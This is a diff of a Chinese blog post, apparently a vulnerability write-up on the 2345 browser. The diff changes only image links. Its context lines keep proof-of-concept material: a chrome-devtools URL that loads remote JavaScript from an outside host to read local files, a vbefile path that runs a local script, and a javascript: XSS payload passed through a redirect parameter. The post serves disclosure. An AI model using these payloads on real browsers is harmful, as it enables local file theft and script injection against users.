@@ -15,12 +15,12 @@ tags: ["安全", "浏览器安全", "XSS"]
 chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://xxx.com/&remoteFrontend=true
 ```
 就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。我写了一个flask程序进行验证，见测试代码。 在C盘新建一个`111.txt`并写入内容，运行服务器之后，在2345浏览器打开`chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&remoteFrontend=true`。本地测试截图：
-![](https://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg)
+![](http://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg)
 
 #### 0x01 WebKit系浏览器伪协议调用
 
 在 http://www.wooyun.org/bugs/wooyun-2010-0175902 中，可以通过`location.href="vbefile:/../../../已知路径/1.js"`来执行本地文件`1.js`
-![](https://ww1.sinaimg.cn/large/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg)
+![](http://ww1.sinaimg.cn/large/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg)
 
 ### 一步一步构造PoC
 
@@ -43,8 +43,8 @@ chrome.ntp2345.prepareThumbnail('chrome-devtools://devtools/bundled/inspector.ht
 ```
 http://cps.2345.com/go/?bid=2014060633&company_id=33&url=javascript:alert(document.domain);//
 ```
-![](https://ww3.sinaimg.cn/large/005GzSIagw1f3hxp65frrj30j20abju9.jpg)
-![](https://ww3.sinaimg.cn/large/005GzSIagw1f3hxp84i17j30k6098ac5.jpg)
+![](http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp65frrj30j20abju9.jpg)
+![](http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp84i17j30k6098ac5.jpg)
 
 #### 0x03 本地文件读取PoC
 服务端代码：https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240
@@ -70,4 +70,4 @@ http://cps.2345.com/go/?bid=2014060633&company_id=33&url=javascript:s=document.c
 
 测试说明：因为请求有时序依赖，所以里面用了5000毫秒的等待时间，来确保顺序的正确性。测试时可以在修改一下里面的域名变成本地的地址，然后运行。
 
-![](https://ww4.sinaimg.cn/large/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif)
+![](http://ww4.sinaimg.cn/large/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif)
